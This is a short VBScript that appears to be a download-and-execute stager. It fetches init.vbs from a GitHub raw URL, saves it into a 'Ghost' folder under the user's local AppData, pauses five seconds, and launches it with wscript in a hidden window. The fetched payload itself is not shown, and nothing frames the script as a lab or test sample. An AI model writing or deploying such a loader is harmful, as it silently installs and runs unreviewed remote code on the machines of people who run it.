Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

ghostDir = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Ghost"
initPath = ghostDir & "\init.vbs"
url = "https://raw.githubusercontent.com/dakj0326/ghost/main/init.vbs"

' Download init.vbs
Set x = CreateObject("MSXML2.XMLHTTP")
x.Open "GET", url, False
x.Send

If x.Status = 200 Then
    If Not fso.FolderExists(ghostDir) Then fso.CreateFolder(ghostDir)
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 2
    stream.Charset = "utf-8"
    stream.Open
    stream.WriteText x.ResponseText
    stream.SaveToFile initPath, 2
    stream.Close
End If

' Wait 5 seconds, then run it
WScript.Sleep 5000
shell.Run "wscript.exe """ & initPath & """", 0, False
